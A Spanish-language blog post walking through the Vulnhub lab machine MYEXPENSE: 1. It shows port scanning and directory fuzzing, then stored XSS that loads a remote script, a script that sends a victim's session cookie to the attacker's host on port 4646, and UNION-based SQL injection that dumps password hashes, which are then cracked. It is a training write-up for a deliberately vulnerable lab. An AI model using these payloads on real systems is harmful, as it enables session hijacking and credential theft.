<!DOCTYPE html>
<head>

  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

    
    <link rel="icon" type="image/png" href="/images/LL2.png" />
<link rel="shortcut icon" type="image/png" href="/images/LL2.png" />

    
    
    <title>Rug4lo</title>
    
    
    <meta name="author" content="Rug4lo" /> 
     
    
    <meta name="description" content="Rug4lo&#39;s Website" /> 
    
    
    <meta name="keywords" content="XSS, CSRF, Cookie Hijacking, SQL, Cracking Hashes, Python, JavaScript" />
    
    <meta property="og:title" content="Vulnhub - MYEXPENSE: 1" />
<meta property="og:description" content="Contenido Reconocimiento Explotación Reconocimiento Primero que todo con el whichsistem.py comprobamos si estamos ante una maquina linux o windows
En este caso nos reportara que la maquina es linux
whichSystem.py 192.168.1.30 Seguidamente aplicamos un reconocimiento con Nmap
nmap -p- --open -T5 -sS -min-rate 5000 -vvv -n -Pn -oG allPorts 192.168.1.30 Todo esto ira a un archivo llamado allPorts, con este comando podremos ver la información mas fácil mente
extractPorts allPorts Ahora que sabemos cuales puertos están abiertos podemos mandar con Nmap un conjunto de scripts de reconocimiento para verificar si alguno tiene una vulnerabilidad" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://rug4lo.github.io/vlnh/2023/03/vulnhub-myexpense-1/" /><meta property="article:section" content="vlnh" />
<meta property="article:published_time" content="2023-03-03T07:28:17+08:00" />
<meta property="article:modified_time" content="2023-03-03T07:28:17+08:00" />


    <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Vulnhub - MYEXPENSE: 1"/>
<meta name="twitter:description" content="Contenido Reconocimiento Explotación Reconocimiento Primero que todo con el whichsistem.py comprobamos si estamos ante una maquina linux o windows
En este caso nos reportara que la maquina es linux
whichSystem.py 192.168.1.30 Seguidamente aplicamos un reconocimiento con Nmap
nmap -p- --open -T5 -sS -min-rate 5000 -vvv -n -Pn -oG allPorts 192.168.1.30 Todo esto ira a un archivo llamado allPorts, con este comando podremos ver la información mas fácil mente
extractPorts allPorts Ahora que sabemos cuales puertos están abiertos podemos mandar con Nmap un conjunto de scripts de reconocimiento para verificar si alguno tiene una vulnerabilidad"/>
<meta name="twitter:site" content="@onevcat"/>


    
    
    
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/disqusjs@1.3.0/dist/disqusjs.css" />
    
    

    
    
    <link rel="stylesheet" href="https://rug4lo.github.io/scss/main.min.adb360f36911df977062e96eb4e21330ce1615c54d3dd63c070161b63452c73b.css" integrity="sha256-rbNg82kR35dwYulutOITMM4WFcVNPdY8BwFhtjRSxzs=" crossorigin="anonymous" media="screen">
	<link href="//netdna.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css" rel="stylesheet">
</head>
  
</head>
<body>
  <span class="mobile btn-mobile-menu">

    <i class="fa fa-list btn-mobile-menu__icon"></i>
    <i class="fa fa-angle-up btn-mobile-close__icon hidden"></i>

  </span>

  <header class="  panel-cover panel-cover--collapsed " style="background-image: url('/images/background-cover.jpg')">

    <div class="panel-main">
  
      <div class="panel-main__inner panel-inverted">
      <div class="panel-main__content">
  
          <a href="/#blog" title="Homepage of Rug4lo " class="blog-button"><img src="/images/avatar.jpg" width="80" alt="Rug4lo logo" class="panel-cover__logo logo" /></a>
          <h1 class="panel-cover__title panel-title"><a href="/#blog" title="Homepage of Rug4lo" class="blog-button">Rug4lo</a></h1>
          <hr class="panel-cover__divider" />
        <p class="panel-cover__description">Hacker  •  Red teamer  •  Pentester</p>
          <hr class="panel-cover__divider panel-cover__divider--secondary" /> 
          <div class="navigation-wrapper">
            <div>
              <nav class="cover-navigatio cover-navigation--primary">
                <ul class="navigation">
                  <li class="navigation__item"><a href="/writeups" title='Writeups' class="sblog-button">Writeups</a></li>
                  <li class="navigation__item"><a href="/blog" title='Blog' class="sblog-button">Blog</a></li>
                  <li class="navigation__item"><a href="/#whoami" title='Whoami' class="blog-button">About</a></li>
                </ul>
              </nav>
            </div>
            <div class="navigation-wrapper">
              <div>
                <nav class="cover-navigatio cover-navigation--primary">
                  <ul class="navigation">
                    <li class="navigation__item"><a href="https://app.hackthebox.com/users/1478590" title="Rug4lo" target="_blank" class="sblog-button">HTB</a></li>
                    <li class="navigation__item"><a href="/" title='Home' class="sblog-button">Home</a></li>
                  </ul>
                </nav>
              </div>
            </div>
            
            <div><nav class="cover-navigation navigation--social">
    <ul class="navigation">
  
    
    
    <li class="navigation__item">
      <a href="https://github.com/Rug4lo" title="Github" target="_blank">
        <i class='social fa fa-github'></i>
        <span class="label">Github</span>
      </a>
    </li>
    

    
    
    <li class="navigation__item">
      <a href="https://www.linkedin.com/in/ruben-garcia-lopez-055496279/" title="Linkedin" target="_blank">
        <i class='social fa fa-linkedin'></i>
        <span class="label">Linkedin</span>
      </a>
    </li>
    

    
    
    <li class="navigation__item">
      <a href="mailto:rubengarciavalladolid@gmail.com" title="Correo Electronico" target="_blank">
        <i class='social fa fa-envelope'></i>
        <span class="label">Email</span>
      </a>
    </li>
    
  
    </ul>
  </nav>
  </div>
          </div>
        </div>
      </div>
      
      
      <div class="panel-cover--overlay cover-red"></div>
      
    </div>
  </header>
  


  <div class="content-wrapper">
    <div class="content-wrapper__inner">

        
<article class="post-container post-container--single" itemscope itemtype="http://schema.org/BlogPosting">
    <header class="post-header">
        <br>
        <br>
        <h1 class="post-title">Vulnhub - MYEXPENSE: 1</h1>
    </header>
    <section class="post">
        <h2 id="contenido">Contenido</h2>
<ul>
<li><a href="#Reconocimiento">Reconocimiento</a></li>
<li><a href="#Explotaci%C3%B3n">Explotación</a></li>
</ul>
<h2 id="Reconocimiento">Reconocimiento</h2>
<p>Primero que todo con el whichsistem.py comprobamos si estamos ante una maquina linux o windows</p>
<p>En este caso nos reportara que la maquina es linux</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>whichSystem.py 192.168.1.30
</span></span></code></pre></div><p>Seguidamente aplicamos un reconocimiento con Nmap</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -T5 -sS -min-rate <span style="color:#ae81ff">5000</span> -vvv -n -Pn -oG allPorts 192.168.1.30
</span></span></code></pre></div><p>Todo esto ira a un archivo llamado allPorts, con este comando podremos ver la información mas fácil mente</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>extractPorts allPorts
</span></span></code></pre></div><p>Ahora que sabemos cuales puertos están abiertos podemos mandar con Nmap un conjunto de scripts de reconocimiento para verificar si alguno tiene una vulnerabilidad</p>
<ul>
<li>El -sCV es para juntar el -sC y el -sV en uno</li>
<li>El -oN es para que nos exporte el resultado a un archivo targeted</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sCV -p80,51045,51193,54585,59179 192.168.1.30 -oN targeted
</span></span></code></pre></div><p>Ahora vamos a hacer fuzzing con Gobuster para descubrir los directorios y archivos de esta web</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dir -u http://192.168.1.30 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
</span></span></code></pre></div><p>Esto nos mostrara lo siguiente:</p>
<p><img src="/vlnh/MYEXPENSE:1/images/1.png" alt="expense"></p>
<p>Este escaneo nos ha mostrado una serie de directorios bastante interesantes, como el /admin</p>
<p>Nos vamos al /admin y con wapalicer podremos ver que la pagina usa PHP como lenguaje principal</p>
<p>Sabiendo esto podemos volver a usar Gobuster para hacer un análisis al /admin en busca de algún archivo PHP</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dir -u http://192.168.1.30/admin/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t <span style="color:#ae81ff">20</span> -x php
</span></span></code></pre></div><p>Esto nos reportara un archivo admin.php</p>
<p><img src="/vlnh/MYEXPENSE:1/images/2.png" alt="expense"></p>
<p>Si nos metemos en este archivo podremos ver algunas credenciales</p>
<p><img src="/vlnh/MYEXPENSE:1/images/3.png" alt="expense"></p>
<p>Ahora vamos a crear una cuenta, ciclamos en donde pone &ldquo;no tienes una cuenta&rdquo; y metemos las credenciales</p>
<p>Pero cuando vamos a crear la cuenta vemos que el botón esta desactivado</p>
<p><img src="/vlnh/MYEXPENSE:1/images/4.png" alt="expense"></p>
<p>Por lo que vamos a irnos al modo inspección (cntrl + shift + c) y modificar el botón de desabilitado a habilitado</p>
<p><img src="/vlnh/MYEXPENSE:1/images/5.png" alt="expense"></p>
<p>Así podremos crear el usuario sin problemas</p>
<h2 id="Explotación">Explotación</h2>
<p>Ahora que hemos comprobado que se puede crear el usuario podemos intentar insertar código JavaScript al crear este usuario (para que al abrir el admin.php nos ejecute este código en el
parámetro del nombre o del apellido)</p>
<p><img src="/vlnh/MYEXPENSE:1/images/6.png" alt="expense"></p>
<p>Ahora refescamos la pagina y comprobamos que efectivamente nos sale una alerta</p>
<p><img src="/vlnh/MYEXPENSE:1/images/7.png" alt="expense"></p>
<p>Ahora vamos a comprobar que podemos recibir información:</p>
<ul>
<li>Primero abrimos un servidor HTTP por el puerto 80</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python -m http.server <span style="color:#ae81ff">80</span>
</span></span></code></pre></div><ul>
<li>Ahora creamos un usuario al que en vez de nombre y apellidos le insertamos este código:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&lt;script src<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://192.168.1.25/pwned.js&#34;</span>&gt;&lt;/script&gt;
</span></span></code></pre></div><ul>
<li>Esto hará que el administrador este haciendo constantemente peticiones a nuestro servidor en el puerto 80 buscando el pwned.js</li>
</ul>
<p>Una vez tenemos esto podemos crear el pwned.js, en este pondremos las instrucciones para que nos habilite el usuario que tenemos desabilitado</p>
<p><img src="/vlnh/MYEXPENSE:1/images/9.png" alt="expense"></p>
<p>Si clicamos donde pone inactive veremos que tramita una petición para activar el usuario pero como no tenemos permisos no nos deja</p>
<p>Así que vamos a hacer que el pwned.js nos tramite la petición como el usuario admin cuando este lo ejecute:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">request</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;http://192.168.1.30/admin/admin.php?id=15&amp;status=active&#39;</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">send</span>();
</span></span></code></pre></div><p>Esto hará que nos podamos conectar como Samuel ya que tenemos sus credenciales</p>
<p>Una vez que nos logeamos podemos ver como tienen un chat interno, y nos falta por tramitar la petición del pago.</p>
<p>Hacemos la petición del pago y ahora tenemos que conseguir un usuario con mas privilegios para aceptarlo</p>
<p>Si nos fijamos nuestro superior es Manon, y tenemos un chat con el, asiq podremos colarle un XSS por el chat, que nos conecte a nuestra maquina pidiendo el pwned.js por el 4646</p>
<p><img src="/vlnh/MYEXPENSE:1/images/11.png" alt="expense"></p>
<p>En el pwned.js pondremos el código que nos mandara la cookie de sesión de esta persona cuando entre al chat (en este caso es la pagina de inicio)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">request</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;http://192.168.1.25:4646/?cookie=&#39;</span> <span style="color:#f92672">+</span> document.<span style="color:#a6e22e">cookie</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">send</span>();
</span></span></code></pre></div><p>Esto nos dará su cookie, ahora hay que sustituirla en nuestro navegador y aceptar el pago</p>
<p><img src="/vlnh/MYEXPENSE:1/images/13.png" alt="expense"></p>
<p>Ahora que hemos validado el pago tenemos que aceptarlo, pero este usuario no tiene permisos suficientes, asiq vamos a hacernos con la cuenta del jefe de Manon el cual es un &ldquo;Financial approver&rdquo; por lo cual tendrá permisos para aceptar el tramite</p>
<p>Esta vez este usuario no mira el chat, por lo que va a ser difícil hacer un XSS</p>
<p>Pero esta parte de la pagina es venerable a una SQL Injection por lo que o vamos a aprovechar</p>
<p><img src="/vlnh/MYEXPENSE:1/images/14.png" alt="expense"></p>
<p>En esta parte de aquí es donde inyectaremos el código SQL</p>
<p><img src="/vlnh/MYEXPENSE:1/images/15.png" alt="expense"></p>
<p>Iremos probando pero acabaremos viendo que la query interna de servidor, en la parte del id = 2 no tiene comillas</p>
<p>Por lo que nos podemos aprovechar de esto para primero averiguar el numero de columnas que tiene (vamos probando hasta que no nos de error)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>?id <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span> order by <span style="color:#ae81ff">2</span>
</span></span></code></pre></div><p>Sabiendo que tiene dos columnas podemos usar un union select para representar algunos datos</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>?id <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span> union <span style="color:#66d9ef">select</span> 1,user<span style="color:#f92672">()</span>-- -
</span></span></code></pre></div><p><img src="/vlnh/MYEXPENSE:1/images/16.png" alt="expense"></p>
<p>Ahora podremos usar lo mismo para listar las bases de datos existentes</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>?id <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span> union <span style="color:#66d9ef">select</span> 1,schema_name from information_schema.schemata-- -
</span></span></code></pre></div><p><img src="/vlnh/MYEXPENSE:1/images/17.png" alt="expense"></p>
<p>Ahora listamos las tablas de la base de datos myexpense</p>
<p><img src="/vlnh/MYEXPENSE:1/images/18.png" alt="expense"></p>
<p>Y listamos las columnas de la tabla user</p>
<p><img src="/vlnh/MYEXPENSE:1/images/19.png" alt="expense"></p>
<p>Ahora podemos listar la información de los campos username y password separados por dos puntos (0x3a)</p>
<p><img src="/vlnh/MYEXPENSE:1/images/20.png" alt="expense"></p>
<p>Copiamos todo y lo ponemos mas legible en el terminal, se vería así:</p>
<p><img src="/vlnh/MYEXPENSE:1/images/21.png" alt="expense"></p>
<p>Como las contraseñas están encriptadas podemos usar esta para para desencriptarlas &ndash;&gt; <a href="https://hashes.com/en/decrypt/hash">https://hashes.com/en/decrypt/hash</a></p>
<p><img src="/vlnh/MYEXPENSE:1/images/22.png" alt="expense"></p>
<p>Vemos que están encriptadas en MD5SUM</p>
<p>Probamos con la contraseña del financial aprover y es &ldquo;HackMe&rdquo;</p>
<p><img src="/vlnh/MYEXPENSE:1/images/23.png" alt="expense"></p>
<p>Nos logeamos como el y aceptamos el importe</p>
<p><img src="/vlnh/MYEXPENSE:1/images/24.png" alt="expense"></p>
<p>Una vez hecho esto nos podemos meter en la cuenta de Samuel y ver como nos dan la flag y el pedido esta completado ; )</p>

    </section>
</article>
<br>
<br>
<section class="read-more">
    
    <div class="read-more-item">
        <span class="read-more-item-dim">Recent</span>
        <h2 class="post-list__post-title post-title"><a href="/htb/2023/03/htb-jupiter/" title="link to HTB - Jupiter">HTB - Jupiter</a></h2>
        <p class="excerpt">Resolucion de la maquina Jupiter - Medium</p>
        <div class="post-list__meta">
            <time datetime=" 2023-03-03 07:28:17 &#43;0800" class="post-list__meta--date date">2023-03-03</time>
             <span class="post-list__meta--tags tags">   • <a href="https://rug4lo.github.io/tags/postgresql-query-exploitation">PostgreSQL Query Exploitation</a>   • <a href="https://rug4lo.github.io/tags/multiple-privilege-escalation">Multiple Privilege Escalation</a>  </span> 
        </div>
    </div>
    


    
    <div class="read-more-item">
        <span class="read-more-item-dim">Recent</span>
        <h2 class="post-list__post-title post-title"><a href="/htb/2023/01/htb-jeeves/" title="link to HTB - Jeeves">HTB - Jeeves</a></h2>
        <p class="excerpt">Resolucion de la maquina Jeeves - Medium</p>
        <div class="post-list__meta">
            <time datetime=" 2023-03-03 07:28:17 &#43;0800" class="post-list__meta--date date">2023-01-24</time>
             
            <span class="post-list__meta--tags tags"> 
                  • <a href="https://rug4lo.github.io/tags/jenkins-exploitation">Jenkins Exploitation</a>   • <a href="https://rug4lo.github.io/tags/rottenpotato">RottenPotato</a>   • <a href="https://rug4lo.github.io/tags/breaking-keepass">Breaking KeePass</a>   • <a href="https://rug4lo.github.io/tags/passthehash">PassTheHash</a>  
            </span>
            
        </div>
    </div>
    
 </section>
  
<br>

        <section class="footer">
    <footer>
        <span class="footer__copyright"> © 2024 - Rug4lo </span>
    </footer>
</section>

    </div>
  </div>

  <script type="text/javascript" src="//code.jquery.com/jquery-1.11.3.min.js"></script>
<script type="text/javascript" src="/js/main.js"></script><script>
    (function(i, s, o, g, r, a, m) {
        i['GoogleAnalyticsObject'] = r;
        i[r] = i[r] || function() {
            (i[r].q = i[r].q || []).push(arguments)
        }, i[r].l = 1 * new Date();
        a = s.createElement(o),
            m = s.getElementsByTagName(o)[0];
        a.async = 1;
        a.src = g;
        m.parentNode.insertBefore(a, m)
    })(window, document, 'script', '//www.google-analytics.com/analytics.js', 'ga');
    ga('create', 'your_ga_id', 'your_host');
    ga('send', 'pageview');
</script>

  
</body>

